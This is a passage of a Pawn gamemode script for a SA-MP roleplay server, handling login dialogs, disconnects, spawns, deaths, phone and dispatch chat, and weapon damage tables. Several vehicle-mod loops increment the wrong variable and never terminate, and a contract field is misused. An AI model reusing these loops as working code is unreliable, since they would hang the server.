	FuelText[playerid] = TextDrawCreate(266.666748, 400.711181, "FuelText");
	TextDrawLetterSize(FuelText[playerid], 0.316222, 1.147022);
	TextDrawAlignment(FuelText[playerid], 1);
	TextDrawColor(FuelText[playerid], -1);
	TextDrawSetShadow(FuelText[playerid], 0);
	TextDrawSetOutline(FuelText[playerid], 1);
	TextDrawBackgroundColor(FuelText[playerid], 51);
	TextDrawFont(FuelText[playerid], 1);
	TextDrawSetProportional(FuelText[playerid], 1);

    SpeedText[playerid] = TextDrawCreate(267.111206, 389.262054, "SpeedText");
	TextDrawLetterSize(SpeedText[playerid], 0.338000, 1.142044);
	TextDrawAlignment(SpeedText[playerid], 1);
	TextDrawColor(SpeedText[playerid], -1);
	TextDrawSetShadow(SpeedText[playerid], 0);
	TextDrawSetOutline(SpeedText[playerid], 1);
	TextDrawBackgroundColor(SpeedText[playerid], 51);
	TextDrawFont(SpeedText[playerid], 1);
	TextDrawSetProportional(SpeedText[playerid], 1);
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    SetPlayerVirtualWorld(playerid, 973942);
    ShowMainMenuGUI(playerid);
    if(IsPlayerNPC(playerid)) {SetPlayerVirtualWorld(playerid, 0); SpawnPlayer(playerid); return 1;}
    if(!Player[playerid][pLoggedIn])
	{
		SetPlayerPos(playerid, 1958.3783, 1343.1572, 15.3746);
    	SetPlayerCameraPos(playerid, 1958.3783, 1343.1572, 15.3746);
    	SetPlayerCameraLookAt(playerid, 1958.3783, 1343.1572, 15.3746);
	    SetSpawnInfo(playerid, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0); // Without this you'll be kicked when you spawn. Set it to wherever you want.
        TogglePlayerSpectating(playerid, true);
        SetTimerEx("login_dialog", 100, 0, "i", playerid);
	    new file[64];
		format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
		if(!dini_Exists(file))
		{
		    ShowDialog(playerid, 1);
		    return 1;
		}
		else
		{
			ShowDialog(playerid, 2);
		}
		return 1;
	}
	else
	{
		SetPlayerPos(playerid, 1975.203002, 3779.311523, -50.243506);
		SetPlayerCameraPos(playerid, 1975.203002, 3779.311523, 100.243506);
		SetPlayerCameraLookAt(playerid, 1975.203002, 3779.311523, -0.243506);
	    SetSpawnInfo(playerid, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
		SpawnPlayer(playerid);
	}
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	new string[128];
	// The rest
	if(Logged(playerid)) {SaveChar(playerid);}
	switch(reason)
	{
	    case 0: format(string, sizeof(string), "* %s has left the server. (Timeout)", GetName(playerid));
	    case 1: format(string, sizeof(string), "* %s has left the server. (Leaving)", GetName(playerid));
	    case 2: format(string, sizeof(string), "* %s has left the server. (Kicked/Banned)", GetName(playerid));
	}
	SendNearbyMessage(playerid, 10, string, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
	foreach(Player, i)
	{
	    if(Specid[i] == playerid)
	    {
	        Spec[i] = 0;
			Specid[i] = -1;
	    	TogglePlayerSpectating(i, 0);
			SetPlayerVirtualWorld(i, Player[playerid][pVW]);
			SetPlayerInterior(i, Player[playerid][pInt]);
			SetPlayerPos(i, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
			SendClientMessage(i, COLOR_WHITE, "* You have stopped spectating players.");
	    }
	}
	// Clearing AD
	for(new i=0; i<MAX_ADS; i++)
	{
		if(strfind(AD[i], GetName(playerid)) != -1)
   		{
   		    format(AD[i], 128, "");
   		}
   	}
   	if(isRelogging[playerid])
	{
        isRelogging[playerid] = false;
        format(string, sizeof(string), "unbanip %s", relogPlayerIP[playerid]);
        SendRconCommand(string);
    }
	// End of Clearing AD
	ClearCar(playerid);
	SaveChar(playerid);
	ClearChar(playerid);
 	if(GetPVarType(playerid, "PlacedBB"))
    {
        DestroyDynamicObject(GetPVarInt(playerid, "PlacedBB"));
        DestroyDynamic3DTextLabel(Text3D:GetPVarInt(playerid, "BBLabel"));
        if(GetPVarType(playerid, "BBArea"))
        {
            foreach(Player,i)
            {
                if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
                {
                    StopAudioStreamForPlayer(i);
                    SendClientMessage(i, COLOR_PURPLE, "The boombox creator has disappered.");
                }
            }
        }
	}
	for(new w = 0; w < 13; w++)
	{
        GiveZamoraWeapon(playerid, Player[playerid][pWeapon][w], Player[playerid][pWeaponAmmo][w]);
	}
	if(IsPlayerTazed(playerid) && IsPlayerCuffed(playerid))
	{
		new RandomCell;
	    ClearZamoraWantedLevels(playerid);
        SetPlayerColor(playerid, TRANSPARENT_WHITE);
    	Player[playerid][pPrison] = 2;
    	Player[playerid][pPrisonTime] = 3600;
    	format(Player[playerid][pPrisonReason], 64, "Loggining while tazed");
    	format(Player[playerid][pPrisonBy], 32, "anti_retard");
    	SetPlayerInterior(playerid, 0);
    	SetPlayerVirtualWorld(playerid, 0);
    	RandomCell = random(sizeof(RandomPrison));
    	SetPlayerFacingAngle(playerid, RandomPrison[RandomCell][3]);
    	TogglePlayerControllable(playerid, 0);
    	SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
	    SetPlayerPos(playerid, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
    	SetCameraBehindPlayer(playerid);
    	format(string, sizeof(string), "AdmCmd: %s has been prisoned by "ANTIHACK", reason: Logging to avoid.", GetName(playerid));
	    SendClientMessageToAll(COLOR_LIGHTRED, string);
    }
  	/*KillTimer(DeleteObjectTimer[playerid]);
	KillTimer(UpdateTimer[playerid]);
    DestroyDynamicObject(ShowFont[playerid]);
    DestroyDynamicObject(GraffitiObject[playerid]);*/
	return 1;
}


public OnPlayerSpawn(playerid)
{
    TogglePlayerSpectating(playerid, false);
    ResetPlayerWeapons(playerid);
    HideMainMenuGUI(playerid);
	// Anti F4 Bug - Logging/Registering
	if(!Player[playerid][pLoggedIn])
	{
		if(IsPlayerNPC(playerid))
		{
			Player[playerid][pModel] = 138;
			SetPlayerSkin(playerid, Player[playerid][pModel]);
		    return 1;
		}
		Streamer_UpdateEx(playerid,370.0804,-2087.8767,7.8359);
		SetPlayerPos(playerid,370.0804,-2087.8767,-10.0);
		SetPlayerCameraPos(playerid,423.3802,-2067.7915,29.8605);
		SetPlayerCameraLookAt(playerid,370.0804,-2087.8767,7.8359);
	    SetSpawnInfo( playerid, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	    new file[64];
		format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	    // Player isn't banned
	    if(dini_Int(file, "AdminAccount") == 1)
		{
		    format(file, sizeof(file), "Accounts/%s.ini",GetAccountName(playerid));
		    SetPlayerName(playerid, dini_Get(file, "OldName"));
		    format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
		    ShowDialog(playerid, 2);
		}
		if(!dini_Exists(file))
		{
		    ShowDialog(playerid, 1);
		    return 1;
		}
		else
		{
			ShowDialog(playerid, 2);
		}
		return 1;
	}
    if(Player[playerid][pLoggedIn] && Player[playerid][pSpawn])
    {
        FalseBan[playerid] = 0;
        SetTimerEx("FalseBanFix", 6000, false, "i", playerid);
    	SpawnChar(playerid);
    }
    /*if(isdied == 1)
   	{
   	    SetPlayerPos(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]);
  	    //SetPlayerCameraPos(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]+5);
        //SetPlayerCameraLookAt(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]);
        TogglePlayerControllable(playerid,false);
        SetPlayerHealth(playerid, 100);
        ApplyAnimation(playerid,"PARACHUTE","FALL_skyDive_DIE", 4.0, 0, 0, 0, 1, 0);
        SetTimerEx("AutoDeath",AUTODEATH_SECONDS * 1000,false,"i",playerid);
        SendClientMessage(playerid,COLOR_MEDIC,"------------------ fise -----------------");
        SendClientMessage(playerid,COLOR_WHITE,"fing death. You are bleeding to death.");
	    SendClientMessage(playerid,COLOR_WHITE,"Remember that the medics can revive you.");
        SendClientMessage(playerid,COLOR_WHITE,"f");
        SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
        return 1;
   	}*/
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	if(Logged(playerid))
	{
	    new string[128];
	    if(!IsAFK[playerid])
	    {
	        if(Event[playerid])
	        {
	        	format(string, sizeof(string), "Event: %s has killed %s using %s.", GetName(killerid), GetName(playerid), RWN(reason));
				foreach(Player, i)
				{
				    if(Event[i]) SendClientMessage(i, COLOR_LIGHTSALMON, string);

				}
				Event[playerid] = 0;
				eventdeath[playerid] = 1;
				Player[playerid][pDead] = 0;
	        }
	        if(Paintball[playerid])
	        {
	        	format(string, sizeof(string), "Paintball: %s has killed %s using %s.", GetName(killerid), GetName(playerid), RWN(reason));
				foreach(Player, i)
				{
				    if(Paintball[i]) SendClientMessage(i, COLOR_LIGHTSALMON, string);

				}
				Paintball[playerid] = 1;
				paintballdeath[playerid] = 1;
				Player[playerid][pDead] = 0;
	        }
			if(Player[playerid][pJail])
			{
                new RandomCell = random(sizeof(RandomJail));
             	SetPlayerFacingAngle(playerid, RandomJail[RandomCell][3]);
             	SetPlayerPos(playerid, RandomJail[RandomCell][0], RandomJail[RandomCell][1], RandomJail[RandomCell][2]);
            }
            if(Player[playerid][pPrison])
			{
                new RandomCell = random(sizeof(RandomPrison));
             	SetPlayerFacingAngle(playerid, RandomPrison[RandomCell][3]);
             	SetPlayerPos(playerid, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
            }
			else
			{
			    if(Logged(killerid))
			    {
					format(string, sizeof(string), "DeathWarning: %s has killed %s using %s.", GetName(killerid), GetName(playerid), RWN(reason));
					SendAdminMessage(COLOR_CHIGS,  string);
					ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",4.1,0,0,0,1,0,0);
					Log("Log/Admins/playerdeath.log", string);
					if(Hitman[killerid] == playerid)
					{
					    format(string, sizeof(string), " You have been critically injured by a hitman and lost $%d, the contrat on your head was cleared.", Player[playerid][pContract]/2);
					    SendClientMessage(playerid, COLOR_YELLOW, string);
					    format(string, sizeof(string), "HitmanWarn: %s has fulfilled the contract on %s's head and collected $%d.", GetName(killerid), GetName(playerid), Player[playerid][pContract]/2);
						SendHitmanMessage(COLOR_YELLOW, string);
						GiveZamoraMoney(playerid, -Player[playerid][pContract]/2);
						GiveZamoraMoney(killerid, Player[playerid][pContract]/2);
						Player[playerid][pContract] = 0;
						format(Player[playerid][pContract], 32, "");
						Hitman[killerid] = -1;
						Player[killerid][pCSuccess] ++;
					}
					if(Hitman[playerid] == killerid)
					{
					    format(string, sizeof(string), " You have critically injured a hitman and collected $%d, the contrat on your head was cleared.", Player[killerid][pContract]);
					    SendClientMessage(killerid, COLOR_YELLOW, string);
					    format(string, sizeof(string), "HitmanWarn: %s has failed the contract on %s's head and lost $%d.", GetName(playerid), GetName(killerid), Player[killerid][pContract]);
						SendHitmanMessage(COLOR_YELLOW, string);
						GiveZamoraMoney(playerid, -Player[killerid][pContract]);
						GiveZamoraMoney(killerid, Player[killerid][pContract]);
						Player[killerid][pContract] = 0;
						format(Player[killerid][pContract], 32, "");
						Hitman[playerid] = -1;
						Player[playerid][pCFail] ++;
					}
				}
			}
			if(BeingCalled[playerid] || Calling[playerid])
			{
			    if(BeingCalled[playerid]) SendClientMessage(Caller[playerid], COLOR_ORANGE, " The line went dead...");
		    	else if(Calling[playerid]) SendClientMessage(Called[playerid], COLOR_ORANGE, " The line went dead...");
			    new var[1];
			    i_hangup(playerid, var);
			}
		}
 		if(GetPVarType(playerid, "PlacedBB"))
    		{
        		DestroyDynamicObject(GetPVarInt(playerid, "PlacedBB"));
        		DestroyDynamic3DTextLabel(Text3D:GetPVarInt(playerid, "BBLabel"));
        		if(GetPVarType(playerid, "BBArea"))
        			{
            		foreach(Player,i)
            			{
                		if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
                			{
                    			StopAudioStreamForPlayer(i);
                    			SendClientMessage(i, COLOR_PURPLE, " The boombox creator has disconnected from the server.");
                			}
            			}
       				}
			}
	}
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	if(vehicleid != 509 && vehicleid != 481 && vehicleid != 510)
	{
	    SetVehicleParamsEx(vehicleid, 0, 0, 0, 0, 0, 0, 0);
	    foreach(Player, i)
		{
		    if(vehicleid == Player[i][pVeh])
		    {
		        if(Player[i][vLocked]) SetVehicleParamsEx(vehicleid, 0, 0, 0, 1, 0, 0, 0);
	            ChangeVehiclePaintjob(Player[i][pVeh], Player[i][vPJ]);
				for(new x=0; x<14; i++)
				{
				    AddVehicleComponent(Player[i][pVeh], Player[i][pVehMod][x]);
				}
		    }
		    if(vehicleid == Player[i][pVVeh])
		    {
		        if(Player[i][vVLocked]) SetVehicleParamsEx(vehicleid, 0, 0, 0, 1, 0, 0, 0);
	            ChangeVehiclePaintjob(Player[i][pVVeh], Player[i][vVPJ]);
				for(new x=0; x<14; i++)
				{
				    AddVehicleComponent(Player[i][pVVeh], Player[i][pVVehMod][x]);
				}
		    }
		    if(vehicleid == Player[i][pVVVeh])
		    {
		        if(Player[i][vVVLocked]) SetVehicleParamsEx(vehicleid, 0, 0, 0, 1, 0, 0, 0);
	            ChangeVehiclePaintjob(Player[i][pVVVeh], Player[i][vVVPJ]);
				for(new x=0; x<14; i++)
				{
				    AddVehicleComponent(Player[i][pVVVeh], Player[i][pVVVehMod][x]);
				}
		    }
		    if(vehicleid == Player[i][pVVVVeh])
		    {
		        if(Player[i][vVVVLocked]) SetVehicleParamsEx(vehicleid, 0, 0, 0, 1, 0, 0, 0);
	            ChangeVehiclePaintjob(Player[i][pVVVVeh], Player[i][vVVVPJ]);
				for(new x=0; x<14; i++)
				{
				    AddVehicleComponent(Player[i][pVVVVeh], Player[i][pVVVVehMod][x]);
				}
		    }
		}
		if(IsTruckerVehicle(vehicleid))
		{
		    TruckPackages[vehicleid] = -1;
		}
		if(Siren[vehicleid])
		{
			Siren[vehicleid] = 0;
	        DestroyDynamicObject(SirenObject[vehicleid]);
        }
    }
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	return 1;
}

public OnPlayerText(playerid, text[])
{
	// Anti Adv
    if(AntiAdv(playerid, text)) return 0;
	// The Rest
	new string[128], log[128];
    if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		format(string, sizeof(string), "[Cellphone - %s]: %s", GetName(playerid), text);
		SendNearbyMessage(playerid, 3.0, string,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON);
		if(Mobile[playerid] == 914)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_BLUE, "Dispatch: Sorry, I don't understand?");
				return 0;
			}
			SendClientMessage(playerid, COLOR_MEDIC, "Dispatch: We have alerted all units in the area.");
			SendClientMessage(playerid, COLOR_MEDIC, "Thank you for reporting this incident");

			format(string, sizeof(string), "Dispatch: All Units IA: Caller: %s",GetName(playerid));
			SendMedicMessage(COLOR_MEDIC, string);
			format(string, sizeof(string), "Dispatch: Incident: %s",text);
			SendMedicMessage(COLOR_MEDIC, string);

			CalledMedics[playerid] = 1;
			MedicsCallTime[playerid] = 60;
			SendClientMessage(playerid, COLOR_WHITE, "They hung up the line.");
			Mobile[playerid] = INVALID_PLAYER_ID;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 18873);
			return 0;
		}
        if(Mobile[playerid] == 913)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_BLUE, "Dispatch: Sorry, I don't understand?");
				return 0;
			}
			SendClientMessage(playerid, COLOR_BLUE, "Dispatch: We have alerted all units in the area.");
			SendClientMessage(playerid, COLOR_BLUE, "Thank you for reporting this incident");

			format(string, sizeof(string), "Dispatch: All Units IA: Caller: %s",GetName(playerid));
			SendCopMessage(COLOR_BLUE, string);
			SendFBIMessage(COLOR_FBI, string);
			format(string, sizeof(string), "Dispatch: Incident: %s",PlayerCrime[playerid][pAccusing]);
			SendCopMessage(COLOR_BLUE, string);
			SendFBIMessage(COLOR_FBI, string);

			CalledCops[playerid] = 1;
			CopsCallTime[playerid] = 60;
			SendClientMessage(playerid, COLOR_WHITE, "They hung up the line.");
			Mobile[playerid] = INVALID_PLAYER_ID;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 18873);
			return 0;
		}
		if(Mobile[playerid] == 912)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_DEPTRADIO, "EMERGENCY: Sorry, I don't understand?");
				return 0;
			}
			strmid(PlayerCrime[playerid][pAccusing], text, 0, strlen(text), 255);
			SendClientMessage(playerid, COLOR_BLUE, "Dispatch: If you know the assailant's name or part of it say it now or just say no.");
			Mobile[playerid] = 913;
			return 0;
		}
		if(Mobile[playerid] == 911)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_DEPTRADIO, "EMERGENCY: Sorry, I don't understand - police or paramedic?");
				return 0;
			}
			else if(strcmp("police", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_DEPTRADIO, "EMERGENCY: I am patching you to police headquarters, please hold...");
				Mobile[playerid] = 912;
				SendClientMessage(playerid, COLOR_BLUE, "Dispatch: Please give me a short description of the crime.");
				return 0;
			}
			else if(strcmp("paramedic", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_DEPTRADIO, "EMERGENCY: I am patching you to lsfmd headquarters, please hold...");
				Mobile[playerid] = 914;
				SendClientMessage(playerid, COLOR_BLUE, "Dispatch: Please give me a short description of the incident.");
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_DEPTRADIO, "EMERGENCY: Sorry, I don't understand - police or paramedic?");
				return 0;
			}
		}
		if(Logged(Mobile[playerid]))
		{
			if(Mobile[Mobile[playerid]] == playerid)
			{
				if(SpeakerPhone[playerid] != 0)
				{
				    format(string, sizeof(string), "[Speaker - Cellphone - %s]: %s", GetName(playerid), text);
					SendNearbyMessage(Mobile[playerid], 3.0, string,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON,COLOR_LIGHTSALMON);
				}
				else
				{
				    SendClientMessage(Mobile[playerid], COLOR_LIGHTSALMON, string);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "There's nobody there.");
			CellTime[playerid] = 0;
			SendClientMessage(playerid,  COLOR_WHITE, "You hung up the line.");
			Mobile[playerid] = INVALID_PLAYER_ID;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 9);
		}
		return 0;
	}
	else if(Live[playerid])
	{
		if(IsNewsVehicle(GetPlayerVehicleID(playerid)))
		{
			format(string, sizeof(string), "** [Live News]: %s: %s", GetName(playerid), text);
			SendClientMessageToAll(COLOR_NEWS, string);
		}
	}
	else
	{
        if(Player[playerid][pMasked] == 0)
    	{
    		if(strlen(Player[playerid][pAccent])) format(string, sizeof(string), "(%s) %s says: %s", Player[playerid][pAccent], GetName(playerid), text);
     		else format(string, sizeof(string), "%s says: %s", GetName(playerid), text);
     	}
     	else
        {
        	format(string, sizeof(string), "Stranger_1911%d23%d says: %s", playerid, playerid+80, text);
        }
		foreach(Player, i)
		{
		    if(Player[i][pAdmin] >= 1 && ICchat[i] && i != playerid)
		    {
		        format(log, sizeof(log), "[BigEar]: %s says: %s", GetName(playerid), text);
		        SendClientMessage(i, COLOR_LIGHTSALMON, log);
		    }
		}
	}
   	SendNearbyMessage(playerid, 10, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	Log("Log/Players/chat.log", string);
    if (IsAfterLifing[playerid] == 1) { return 0; }
	if(Player[playerid][pTutorial] != 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to type anything while you are in the tutorial.");
		return 0;
	}
	return 0;
}


public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    new Float:HP;
    new Float:Armor;
    GetPlayerHealth(playerid, HP);
    GetPlayerArmour(playerid, Armor);
    if(issuerid != INVALID_PLAYER_ID)
    {
        if(Armor != 0)
		{
            switch(weaponid)
            {
                case 22:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 23:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 24:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-20); // Torso
                        case 4: SetPlayerHealth(playerid, HP-15); // Groin
                        case 5: SetPlayerHealth(playerid, HP-10); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-10); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-10); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-10); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-25); // Head
                    }
                }
                case 25:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-25); // Torso
                        case 4: SetPlayerHealth(playerid, HP-20); // Groin
                        case 5: SetPlayerHealth(playerid, HP-15); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-15); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-15); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-15); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-30); // Head
                    }
                }
                case 27:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-30); // Torso
                        case 4: SetPlayerHealth(playerid, HP-25); // Groin
                        case 5: SetPlayerHealth(playerid, HP-20); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-20); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-20); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-20); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-50); // Head
                    }
                }
                case 28:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-15); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 29:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-15); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 30:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-20); // Torso
                        case 4: SetPlayerHealth(playerid, HP-14); // Groin
                        case 5: SetPlayerHealth(playerid, HP-9); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-9); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-8); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-8); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-40); // Head
                    }
                }
                case 31:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-21); // Torso
                        case 4: SetPlayerHealth(playerid, HP-14); // Groin
                        case 5: SetPlayerHealth(playerid, HP-9); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-9); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-8); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-8); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-40); // Head
                    }
                }
                case 32:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 33:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-26); // Torso
                        case 4: SetPlayerHealth(playerid, HP-15); // Groin
                        case 5: SetPlayerHealth(playerid, HP-10); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-14); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-10); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-14); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-90); // Head
                    }
                }
                case 34:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerArmour(playerid, Armor-33); // Torso
                        case 4: SetPlayerHealth(playerid, HP-28); // Groin
                        case 5: SetPlayerHealth(playerid, HP-20); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-20); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-20); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-20); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-100); // Head
                    }
                }
            }
        }
        else
		{
        if(Armor <= 0)
            switch(weaponid)
            {
                case 22:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 23:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 24:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-20); // Torso
                        case 4: SetPlayerHealth(playerid, HP-15); // Groin
                        case 5: SetPlayerHealth(playerid, HP-10); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-10); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-10); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-10); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-25); // Head
                    }
                }
                case 25:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-25); // Torso
                        case 4: SetPlayerHealth(playerid, HP-20); // Groin
                        case 5: SetPlayerHealth(playerid, HP-15); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-15); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-15); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-15); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-30); // Head
                    }
                }
                case 27:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-30); // Torso
                        case 4: SetPlayerHealth(playerid, HP-25); // Groin
                        case 5: SetPlayerHealth(playerid, HP-20); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-20); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-20); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-20); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-50); // Head
                    }
                }
                case 28:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-15); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 29:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-15); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
